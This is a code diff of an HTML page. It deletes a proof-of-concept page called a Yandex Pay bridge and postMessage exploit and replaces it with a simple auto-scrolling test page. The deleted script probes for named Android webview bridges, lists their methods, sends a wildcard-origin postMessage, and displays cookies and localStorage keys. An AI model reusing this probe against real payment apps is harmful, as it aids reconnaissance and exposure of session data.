@@ -1,77 +1,57 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>PoC</title>
-    <style>
-        body {
-            font: 13px monospace;
-            padding: 8px;
-            background: #111;
-            color: #0f0;
-        }
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Scroll Test</title>
 
-        h1 {
-            color: #ff0;
-            font-size: 18px;
-        }
+<style>
+html, body {
+    margin: 0;
+    padding: 0;
+    background: #000;   /* dark background */
+    color: #fff;        /* white text */
+    font-family: Arial, sans-serif;
+}
 
-        .r { color: #f44; }
-        .g { color: #4f4; }
-        .y { color: #ff0; }
-    </style>
+.section {
+    height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 28px;
+}
+
+#top {
+    background: #000;
+}
+
+#bottom {
+    background: #000;
+}
+</style>
 </head>
+
 <body>
 
-<h1>YANDEX PAY BRIDGE + postMessage EXPLOIT</h1>
-<div id="L"></div>
+<div id="top" class="section">
+    THIS IS THE TOP
+</div>
+
+<div style="height: 2000px;"></div>
+
+<div id="bottom" class="section">
+    THIS IS THE BOTTOM
+</div>
 
 <script>
-    var L = document.getElementById('L');
-
-    function log(c, m) {
-        L.innerHTML += '<div class="' + c + '">' + m + '</div>';
-    }
-
-    var fb = [];
-
-    // Bridge enumeration
-    [
-        'YandexPayAndroid',
-        'YandexPaySplitChallenge',
-        'androidListener',
-        'ybChallengeNativeObserver'
-    ].forEach(function (n) {
-        try {
-            if (typeof window[n] !== 'undefined' && window[n] !== null) {
-                fb.push(n);
-                log('g', 'FOUND: ' + n);
-
-                try {
-                    log('g', '  methods: ' + Object.getOwnPropertyNames(window[n]).join(','));
-                } catch (e) {}
-            }
-        } catch (e) {}
+// Auto-scroll after 2 seconds
+setTimeout(() => {
+    window.scrollTo({
+        top: document.body.scrollHeight,
+        behavior: "smooth"
     });
-
-    if (!fb.length) {
-        log('r', 'No bridges in this context');
-    }
-
-    // postMessage relay
-    window.postMessage({ type: "SUCCESS", payload: null }, '*');
-    log('y', 'postMessage relay sent');
-
-    // Cookie + storage
-    log('y', 'cookie: ' + (document.cookie || 'empty'));
-
-    try {
-        log('y', 'ls keys: ' + Object.keys(localStorage).join(','));
-    } catch (e) {}
-
-    log('y', 'SSL: page loaded (self-signed accepted)');
-    log('y', 'SUMMARY: bridges=' + fb.length + ' ssl=loaded');
+}, 2000);
 </script>
 
 </body>
